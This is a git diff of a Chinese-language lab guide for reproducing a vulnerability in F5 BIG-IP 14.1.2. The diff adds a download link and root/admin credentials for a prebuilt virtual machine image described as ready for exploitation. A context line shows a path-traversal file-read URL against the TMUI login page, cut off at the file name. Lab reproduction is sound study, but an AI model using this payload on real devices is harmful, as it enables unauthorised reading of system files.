@@ -56,9 +56,12 @@ description: 图是偷的，过程是自己的
 ### 2、 导入虚拟机
 
 下载BIG-IP的.ova文件，这里因为在外面下载的太慢了，百度链接如下：  
-14.1.2版本：  
+14.1.2版本OVA文件：  
 链接：[https://pan.baidu.com/s/1VFHVwLhiDsW3W2x7fwcUuw](https://pan.baidu.com/s/1VFHVwLhiDsW3W2x7fwcUuw)   
 提取码：rbtk
+
+14.1.2版本VMDK文件：（打开虚拟机，配置IP后可**直接**漏洞利用，root,admin/Admin!@\#456）  
+链接：[https://pan.baidu.com/s/1FdWZg9lf7dF109pLxedn7A](https://pan.baidu.com/s/1FdWZg9lf7dF109pLxedn7A) 提取码：ali4
 
 下载成功后，导入到虚拟机，开机即可
 
@@ -111,6 +114,8 @@ http://IP:PORT/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/
 效果图如下：
 
 ![](../.gitbook/assets/bigip13.jpg)
+
+
 
 
 
